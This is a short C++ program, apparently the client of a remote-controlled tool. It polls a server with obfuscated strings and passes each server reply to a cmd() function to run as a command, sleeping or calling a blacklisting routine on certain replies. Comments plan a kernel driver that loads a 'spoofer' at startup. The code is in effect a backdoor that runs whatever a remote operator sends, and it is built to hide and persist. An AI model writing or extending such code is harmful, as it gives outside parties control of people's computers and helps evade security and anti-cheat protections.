#include <windows.h>
#include <iostream>
#include <string>
#include "Functions.h"
using namespace std;

int main(int argc, char* argv[])
{
    string response = apiCall(skCrypt("check")); // this is essentually on startup. So every time "check is run" they have started up this file
    //if (response == "Blacklisted") blacklisted();
    if (response == "Linked") while (true) {
        response = apiCall(skCrypt(""));
        if (response == "wait") Sleep(5000);
        if (response == "removePerm") blacklisted();
        if (response == "Blacklisted") blacklisted();
        if (response != "wait" && response != "Blacklisted") cmd(to_char(response));

    }
    if (response == "Not Linked") {
        // install kernel drv to load spoofer on start.
        // print msg to user.
    }
}